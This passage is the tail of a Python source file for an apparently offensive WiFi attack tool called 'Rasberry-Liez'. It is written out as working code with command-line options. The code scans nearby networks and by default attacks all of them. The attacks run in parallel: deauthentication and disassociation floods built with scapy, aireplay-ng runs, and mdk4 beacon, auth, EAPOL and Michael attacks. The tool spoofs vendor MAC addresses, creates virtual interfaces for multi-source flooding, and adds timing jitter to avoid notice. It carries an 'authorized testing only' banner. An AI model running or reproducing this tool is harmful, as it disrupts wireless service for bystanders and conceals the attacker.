        "attacks": ["deauth", "disassoc", "auth-flood", "beacon-flood",
                    "mdk4-deauth", "eapol"],
        "sources": 6, "count": 64, "jitter": 1.0,
        "desc": "Major attacks, moderate volume, some jitter",
    },
    "aggressive": {
        "attacks": ["deauth", "disassoc", "auth-flood", "beacon-flood",
                    "probe-flood", "mdk4-deauth", "eapol", "michael"],
        "sources": 10, "count": 128, "jitter": 0.0,
        "desc": "High volume, many sources, no jitter",
    },
    "chaos": {
        "attacks": list(ALL_ATTACK_LIST),
        "sources": 16, "count": 256, "jitter": 0.0,
        "desc": "Everything at maximum — total chaos",
    },
}


class Orchestrator:
    def __init__(self, cfg: dict):
        self.cfg = cfg
        self.running = True
        self._stop = threading.Event()

        self.mac_mgr = MACManager(
            enabled=cfg["mac_spoofing"],
            vendor_mode=cfg["vendor_mac"],
            pool_size=cfg["mac_pool_size"],
        )
        self.ifmgr = InterfaceManager(
            cfg["phy_interface"], cfg["monitor_interface"],
            cfg["use_airmon_ng"], self.mac_mgr,
        )
        self.scanner = Scanner(self.ifmgr.mon, scan_time=cfg.get("scan_time", 5))
        self.firewall = Firewall(
            self.ifmgr.mon,
            block_traffic=cfg["block_incoming"],
            block_icmp=cfg["block_icmp_timestamp"],
            scoped=cfg["scope_iptables"],
        )
        self.stats = AttackStats()
        self.attacks = Attacks(self.ifmgr, self.mac_mgr, self.stats, cfg)
        self.attack_log: list[dict] = []
        self._log_lock = threading.Lock()

        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def _signal_handler(self, sig, frame):
        log.info("Signal received — shutting down...")
        self.running = False
        self._stop.set()

    def _sleep(self, secs):
        if self.cfg.get("jitter", 0) > 0:
            secs += random.uniform(0, self.cfg["jitter"])
        self._stop.wait(timeout=secs)

    # -- Filtering --

    def _filter_networks(self, nets: list[Network]) -> list[Network]:
        filtered = nets

        wl = self.cfg.get("whitelist_essid")
        if wl:
            filtered = [n for n in filtered if n.essid in wl]

        wl_b = self.cfg.get("whitelist_bssid")
        if wl_b:
            filtered = [n for n in filtered if n.bssid in wl_b]

        bl = self.cfg.get("blacklist_essid")
        if bl:
            filtered = [n for n in filtered if n.essid not in bl]

        bl_b = self.cfg.get("blacklist_bssid")
        if bl_b:
            filtered = [n for n in filtered if n.bssid not in bl_b]

        min_pwr = self.cfg.get("min_power")
        if min_pwr is not None:
            filtered = [n for n in filtered if n.power >= min_pwr]

        enc_filter = self.cfg.get("enc_filter")
        if enc_filter:
            filtered = [n for n in filtered if any(e in n.encryption.upper() for e in enc_filter)]

        band = self.cfg.get("band")
        if band == "2ghz":
            filtered = [n for n in filtered if 1 <= n.channel <= 14]
        elif band == "5ghz":
            filtered = [n for n in filtered if n.channel > 14]

        return filtered

    # -- Resolve attacks --

    def _resolve_attacks(self) -> list[str]:
        profile_name = self.cfg.get("profile")
        if profile_name and profile_name in PROFILES:
            return list(PROFILES[profile_name]["attacks"])

        modes = self.cfg.get("attack_modes", ["deauth"])
        if "all" in modes:
            return list(ALL_ATTACK_LIST)
        return list(modes)

    def _get_sources(self) -> int:
        profile_name = self.cfg.get("profile")
        if profile_name and profile_name in PROFILES:
            return PROFILES[profile_name]["sources"]
        return self.cfg.get("sources", 4)

    def _get_count(self) -> int:
        profile_name = self.cfg.get("profile")
        if profile_name and profile_name in PROFILES:
            return PROFILES[profile_name]["count"]
        return self.cfg.get("count", 64)

    def _get_jitter(self) -> float:
        profile_name = self.cfg.get("profile")
        if profile_name and profile_name in PROFILES:
            return PROFILES[profile_name]["jitter"]
        return self.cfg.get("jitter", 0)

    # -- Execute one attack on one network (thread-safe) --

    def _attack_network(self, net: Network, attack_mode: str):
        sources = self._get_sources()
        count = self._get_count()
        reason = self.cfg.get("deauth_reason", 7)

        try:
            self.attacks.execute(attack_mode, net, count, sources, reason)
            with self._log_lock:
                self.attack_log.append({
                    "time": datetime.now().isoformat(),
                    "mode": attack_mode,
                    "essid": net.essid,
                    "bssid": net.bssid,
                    "channel": net.channel,
                })
        except Exception as e:
            self.stats.inc("errors")
            log.error(f"Attack {attack_mode} on {net.essid} failed: {e}", exc_info=True)

    # -- Parallel attack: all modes fire simultaneously per network --

    def _attack_network_all_parallel(self, net: Network, attack_modes: list[str]):
        self.stats.inc("aps_targeted")

        scapy_modes = [m for m in attack_modes if m in SCAPY_ATTACKS]
        tool_modes = [m for m in attack_modes if m in TOOL_ATTACKS]

        log.debug(f"[parallel] {net.essid} ({net.bssid}): "
                  f"{len(scapy_modes)} scapy + {len(tool_modes)} tool = "
                  f"{len(scapy_modes) + len(tool_modes)} total attacks launching")

        futures = []
        t0 = time.time()
        with ThreadPoolExecutor(max_workers=max(len(attack_modes), 2)) as pool:
            for mode in scapy_modes:
                if not self.running:
                    break
                log.debug(f"  -> submitting scapy/{mode} on {net.essid}")
                futures.append(pool.submit(self._attack_network, net, mode))

            for mode in tool_modes:
                if not self.running:
                    break
                log.debug(f"  -> submitting tool/{mode} on {net.essid}")
                futures.append(pool.submit(self._attack_network, net, mode))

            for f in as_completed(futures):
                try:
                    f.result()
                except Exception as e:
                    self.stats.inc("errors")
                    log.error(f"Parallel attack error: {e}", exc_info=True)

        elapsed = time.time() - t0
        log.debug(f"[parallel] {net.essid} — all {len(futures)} attacks done in {elapsed:.1f}s")

    # -- Multi-source parallel via virtual interfaces --

    def _parallel_multi_source(self, net: Network, attack_modes: list[str]):
        sources = self._get_sources()
        count = self._get_count()

        interfaces_to_use = [self.ifmgr.mon]
        num_vifs = min(sources - 1, 3)
        for i in range(num_vifs):
            name = f"rblz{i}"
            if self.ifmgr.create_vif(name):
                interfaces_to_use.append(name)

        def _vif_attack(iface, mode):
            try:
                self.ifmgr.set_channel(iface, net.channel)
                mac = self.ifmgr.spoof_and_up(iface)
                if mac:
                    self.stats.inc("macs_used")

                if mode in SCAPY_ATTACKS and self.attacks._ensure_scapy():
                    reason = self.cfg.get("deauth_reason", 7)
                    targets = net.clients if net.clients else [self.cfg["target_client_mac"]]
                    Dot11Cls = self.attacks._Dot11Deauth if mode == "deauth" else self.attacks._Dot11Disas
                    pkts = []
                    for client in targets:
                        dst = client if client != "FF:FF:FF:FF:FF:FF" else "FF:FF:FF:FF:FF:FF"
                        pkts.append(
                            self.attacks._RadioTap() /
                            self.attacks._Dot11(addr1=dst, addr2=net.bssid, addr3=net.bssid) /
                            Dot11Cls(reason=reason))
                        if mac:
                            pkts.append(
                                self.attacks._RadioTap() /
                                self.attacks._Dot11(addr1=net.bssid, addr2=mac, addr3=net.bssid) /
                                Dot11Cls(reason=reason))
                    self.attacks._scapy_send(pkts, iface, count)
                    stat_key = "deauths_sent" if mode == "deauth" else "disassocs_sent"
                    self.stats.inc(stat_key, count * len(pkts))
                else:
                    cmd = ['aireplay-ng', '-0', str(self.cfg["packets"]),
                           '-a', net.bssid, '-c', self.cfg["target_client_mac"], iface]
                    run(cmd, check=False, timeout=self.cfg["attack_duration_per_ap"])
                    self.stats.inc("deauths_sent", 64)
            except Exception as e:
                self.stats.inc("errors")
                log.error(f"VIF attack from {iface} failed: {e}", exc_info=True)

        with ThreadPoolExecutor(max_workers=len(interfaces_to_use)) as pool:
            futs = []
            for i, iface in enumerate(interfaces_to_use):
                mode = attack_modes[i % len(attack_modes)]
                futs.append(pool.submit(_vif_attack, iface, mode))
            for f in as_completed(futs):
                try:
                    f.result()
                except Exception as e:
                    log.error(f"Multi-source error: {e}", exc_info=True)

        self.ifmgr.destroy_vifs()

    # -- Main entry --

    def run(self):
        self._preflight()
        self.ifmgr.start_monitor()
        self.scanner.iface = self.ifmgr.mon
        self.firewall.iface = self.ifmgr.mon
        self.firewall.engage()

        try:
            target = self.cfg.get("target_bssid")
            if target:
                self._run_targeted(target)
            else:
                self._run_all()
        finally:
            log.info("--- Cleanup ---")
            self.firewall.disengage()
            self.ifmgr.stop_monitor()
            self._save_log()
            print(self.stats.summary())

    def _preflight(self):
        if os.geteuid() != 0:
            log.error("Must be root.")
            sys.exit(1)
        self.ifmgr.check_exists()

        tools = ['ifconfig', 'iwconfig', 'aireplay-ng', 'iptables']
        if self.cfg["mac_spoofing"]:
            tools.append('macchanger')
        if self.cfg["use_airmon_ng"]:
            tools.append('airmon-ng')

        attack_modes = self._resolve_attacks()
        if any(m in attack_modes for m in ["eapol", "michael", "wids", "mdk4-deauth"]):
            tools.append('mdk4')

        missing = [t for t in tools if subprocess.call(
            ['which', t], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0]
        if missing:
            log.error(f"Missing: {', '.join(missing)}")
            sys.exit(1)

        if self.mac_mgr.enabled:
            self.ifmgr.original_mac = self.ifmgr.get_permanent_mac()
            if self.ifmgr.original_mac:
                log.info(f"Original MAC: {self.ifmgr.original_mac}")

    def _run_all(self):
        attack_modes = self._resolve_attacks()
        multi_source = self.cfg.get("multi_source")
        workers = self.cfg.get("max_workers", 4)

        while self.running:
            self.stats.inc("cycles")
            log.info(f"=== Cycle {self.stats.cycles} | {len(attack_modes)} attacks in parallel ===")

            if not self.ifmgr.ensure_monitor(self.stats):
                log.error("Cannot recover monitor mode. Waiting before retry...")
                self._sleep(10)
                continue

            if self.mac_mgr.enabled:
                with self.ifmgr._lock:
                    self.ifmgr.spoof_and_up(self.ifmgr.mon)
                self.stats.inc("macs_used")

            networks = self.scanner.scan_airodump()
            if not networks:
                networks = self.scanner.scan_iwlist()
            networks = self._filter_networks(networks)

            if not networks:
                log.info(f"No targets. Retrying in {self.cfg['scan_interval']}s...")
                self._sleep(self.cfg['scan_interval'])
                continue

            log.info(f"Targets: {len(networks)} networks")
            for n in networks:
                clients_str = f", {len(n.clients)} clients" if n.clients else ""
                log.info(f"  {n.essid:25s} {n.bssid} ch{n.channel:3d} "
                         f"pwr={n.power:4d} {n.encryption}{clients_str}")

            if multi_source:
                log.debug(f"Multi-source mode: attacking {len(networks)} networks with VIFs")
                for net in networks:
                    if not self.running:
                        break
                    self._parallel_multi_source(net, attack_modes)
                    self._sleep(self.cfg["inter_attack_delay"])
            else:
                log.info(f"Dispatching {len(networks)} networks x {len(attack_modes)} attacks "
                         f"across {workers} worker threads")
                t_cycle = time.time()
                with ThreadPoolExecutor(max_workers=workers) as pool:
                    futs = {}
                    for net in networks:
                        if not self.running:
                            break
                        log.debug(f"  => pool.submit({net.essid} / {net.bssid})")
                        f = pool.submit(self._attack_network_all_parallel, net, attack_modes)
                        futs[f] = net.essid
                    for f in as_completed(futs):
                        try:
                            f.result()
                            log.debug(f"  <= {futs[f]} completed")
                        except Exception as e:
                            self.stats.inc("errors")
                            log.error(f"Network attack error on {futs[f]}: {e}", exc_info=True)
                log.info(f"All network attacks done in {time.time() - t_cycle:.1f}s")

            log.info(f"Cycle {self.stats.cycles} done. MACs used: {self.mac_mgr.count} | "
                     f"Errors: {self.stats.errors} | Next scan in {self.cfg['scan_interval']}s...")
            log.debug(self.stats.summary())
            self._sleep(self.cfg['scan_interval'])

    def _run_targeted(self, target_bssid: str):
        target_bssid = target_bssid.upper()
        attack_modes = self._resolve_attacks()
        multi_source = self.cfg.get("multi_source")

        log.info(f"Single-target mode: {target_bssid}")
        while self.running:
            self.stats.inc("cycles")

            if not self.ifmgr.ensure_monitor(self.stats):
                log.error("Cannot recover monitor mode. Waiting...")
                self._sleep(10)
                continue

            if self.mac_mgr.enabled:
                with self.ifmgr._lock:
                    self.ifmgr.spoof_and_up(self.ifmgr.mon)
                self.stats.inc("macs_used")

            networks = self.scanner.scan_airodump()
            if not networks:
                networks = self.scanner.scan_iwlist()

            match = None
            for n in networks:
                if n.bssid == target_bssid:
                    match = n
                    break

            if not match:
                log.warning(f"Target {target_bssid} not found. Retrying...")
                self._sleep(self.cfg['scan_interval'])
                continue

            log.info(f"Target: {match.essid} ch{match.channel} "
                     f"pwr={match.power} {len(match.clients)} clients")

            if multi_source:
                self._parallel_multi_source(match, attack_modes)
            else:
                self._attack_network_all_parallel(match, attack_modes)

            self._sleep(self.cfg['inter_attack_delay'])

    def _save_log(self):
        logfile = self.cfg.get("logfile")
        if not logfile or not self.attack_log:
            return
        try:
            with open(logfile, 'w', newline='') as f:
                writer = csv.DictWriter(f, fieldnames=["time", "mode", "essid", "bssid", "channel"])
                writer.writeheader()
                writer.writerows(self.attack_log)
            log.info(f"Attack log saved to {logfile}")
        except Exception as e:
            log.error(f"Failed to save log: {e}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def parse_args():
    p = argparse.ArgumentParser(
        description="Rasberry-Liez — Multi-vector WiFi auditing framework.",
        epilog="For authorized security testing only.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    iface = p.add_argument_group("Interface")
    iface.add_argument("-i", "--interface", default="wlan0",
                       help="Physical wireless interface (default: wlan0)")
    iface.add_argument("-m", "--monitor", default="wlan0mon",
                       help="Monitor interface name (default: wlan0mon)")
    iface.add_argument("--no-airmon", action="store_true",
                       help="Don't use airmon-ng for monitor mode")

    attack = p.add_argument_group("Attack")
    attack.add_argument("-A", "--attack", nargs='+', default=["all"],
                        choices=list(ATTACK_MODES.keys()),
                        help="Attack mode(s) (default: all)")
    attack.add_argument("--profile", choices=list(PROFILES.keys()),
                        default="stealth",
                        help="Attack profile (default: stealth)")
    attack.add_argument("-d", "--duration", type=int, default=15,
                        help="Duration per AP per tool-attack in seconds (default: 15)")
    attack.add_argument("-p", "--packets", type=int, default=0,
                        help="Deauth packets for aireplay (0=continuous, default: 0)")
    attack.add_argument("--count", type=int, default=64,
                        help="Scapy frame repeat count per burst (default: 64)")
    attack.add_argument("--sources", type=int, default=4,
                        help="Spoofed source MACs per scapy attack (default: 4)")
    attack.add_argument("--reason", type=int, default=7,
                        help="Deauth reason code 0-254 (default: 7)")
    attack.add_argument("--ghost", default=None, metavar="P,R,T",
                        help="mdk4 ghosting: period_ms,max_rate_mbit,min_txpower_dbm")
    attack.add_argument("--frag", default=None, metavar="MIN,MAX,PCT",
                        help="mdk4 fragmentation: min_frags,max_frags,percent")

    target = p.add_argument_group("Targeting")
    target.add_argument("-t", "--target", default=None, metavar="BSSID",
                        help="Target single AP by BSSID")
    target.add_argument("-c", "--client", default="FF:FF:FF:FF:FF:FF",
                        help="Target client MAC (default: broadcast)")
    target.add_argument("--whitelist", nargs='+', default=None, metavar="ESSID")
    target.add_argument("--whitelist-bssid", nargs='+', default=None, metavar="BSSID")
    target.add_argument("--blacklist", nargs='+', default=None, metavar="ESSID")
    target.add_argument("--blacklist-bssid", nargs='+', default=None, metavar="BSSID")
    target.add_argument("--min-power", type=int, default=None,
                        help="Minimum signal strength (e.g. -70)")
    target.add_argument("--enc-filter", nargs='+', default=None,
                        metavar="TYPE", help="Filter by encryption (WPA2, WPA, WEP, OPN)")
    target.add_argument("--band", choices=["2ghz", "5ghz"], default=None)

    mac_grp = p.add_argument_group("MAC Spoofing")
    mac_grp.add_argument("--no-mac-spoof", action="store_true",
                         help="Disable MAC spoofing entirely")
    mac_grp.add_argument("--no-vendor-mac", action="store_true",
                         help="Use random MACs instead of vendor OUI (vendor ON by default)")
    mac_grp.add_argument("--mac-pool", type=int, default=0, metavar="N",
                         help="Pre-generate N MACs and rotate through pool")

    par = p.add_argument_group("Parallel / Multi-source")
    par.add_argument("--multi-source", action="store_true",
                     help="Create virtual interfaces for true multi-source attacks")
    par.add_argument("-w", "--workers", type=int, default=4,
                     help="Thread pool workers for parallel network attacks (default: 4)")

    timing = p.add_argument_group("Timing")
    timing.add_argument("-s", "--scan-interval", type=int, default=25,
                        help="Seconds between scan cycles (default: 25)")
    timing.add_argument("--scan-time", type=int, default=5,
                        help="Airodump scan duration in seconds (default: 5)")
    timing.add_argument("--delay", type=float, default=0.3,
                        help="Delay between per-AP attacks (default: 0.3)")
    timing.add_argument("--jitter", type=float, default=4.0,
                        help="Random jitter added to delays (default: 4.0)")

    fw = p.add_argument_group("Firewall")
    fw.add_argument("--no-block", action="store_true",
                    help="Don't block incoming traffic")
    fw.add_argument("--no-icmp-block", action="store_true",
                    help="Don't block ICMP timestamp/mask requests")
    fw.add_argument("--global-block", action="store_true",
                    help="Apply iptables globally instead of per-interface")

    misc = p.add_argument_group("Misc")
    misc.add_argument("--logfile", default=None, metavar="FILE",
                      help="Save attack log to CSV file")
    misc.add_argument("-q", "--quiet", action="store_true",
                      help="Reduce logging to INFO only (verbose/DEBUG is default)")
    misc.add_argument("--list-attacks", action="store_true",
                      help="List all attack modes and exit")
    misc.add_argument("--list-profiles", action="store_true",
                      help="List attack profiles and exit")

    return p.parse_args()


def main():
    args = parse_args()

    if args.list_attacks:
        print("Available attack modes:")
        for k, v in ATTACK_MODES.items():
            print(f"  {k:16s}  {v}")
        sys.exit(0)

    if args.list_profiles:
        print("Attack profiles:")
        for k, v in PROFILES.items():
            print(f"  {k:12s}  {v['desc']}")
            print(f"               attacks: {', '.join(v['attacks'])}")
            print(f"               sources={v['sources']} count={v['count']} jitter={v['jitter']}")
        sys.exit(0)

    if args.quiet:
        logging.getLogger().setLevel(logging.INFO)

    print(r"""
  ____            _                            _     _
 |  _ \ __ _ ___ | |__   ___ _ __ _ __ _   _  | |   (_) ___ ____
 | |_) / _` / __|| '_ \ / _ \ '__| '__| | | | | |   | |/ _ \_  /
 |  _ < (_| \__ \| |_) |  __/ |  | |  | |_| | | |___| |  __// /
 |_| \_\__,_|___/|_.__/ \___|_|  |_|   \__, | |_____|_|\___/___|
                                        |___/
    Multi-Vector WiFi Auditing Framework
""")
    print("WARNING: Authorized security testing only. You must have explicit permission.")
    print("Press Ctrl+C to stop.\n")
    time.sleep(1)

    config = {
        "phy_interface": args.interface,
        "monitor_interface": args.monitor,
        "use_airmon_ng": not args.no_airmon,
        "attack_duration_per_ap": args.duration,
        "packets": args.packets,
        "count": args.count,
        "sources": args.sources,
        "target_client_mac": args.client,
        "scan_interval": args.scan_interval,
        "scan_time": args.scan_time,
        "inter_attack_delay": args.delay,
        "jitter": args.jitter,
        "mac_spoofing": not args.no_mac_spoof,
        "vendor_mac": not args.no_vendor_mac,
        "mac_pool_size": args.mac_pool,
        "max_workers": args.workers,
        "block_incoming": not args.no_block,
        "block_icmp_timestamp": not args.no_icmp_block,
        "scope_iptables": not args.global_block,
        "attack_modes": args.attack,
        "profile": args.profile,
        "target_bssid": args.target,
        "deauth_reason": args.reason,
        "ghost": args.ghost,
        "frag": args.frag,
        "multi_source": args.multi_source,
        "whitelist_essid": set(args.whitelist) if args.whitelist else None,
        "whitelist_bssid": set(b.upper() for b in args.whitelist_bssid) if args.whitelist_bssid else None,
        "blacklist_essid": set(args.blacklist) if args.blacklist else None,
        "blacklist_bssid": set(b.upper() for b in args.blacklist_bssid) if args.blacklist_bssid else None,
        "min_power": args.min_power,
        "enc_filter": [e.upper() for e in args.enc_filter] if args.enc_filter else None,
        "band": args.band,
        "logfile": args.logfile,
    }

    log.debug("--- Configuration ---")
    for k, v in sorted(config.items()):
        log.debug(f"  {k}: {v}")
    log.debug("---------------------")

    orc = Orchestrator(config)
    orc.run()


if __name__ == "__main__":
    main()
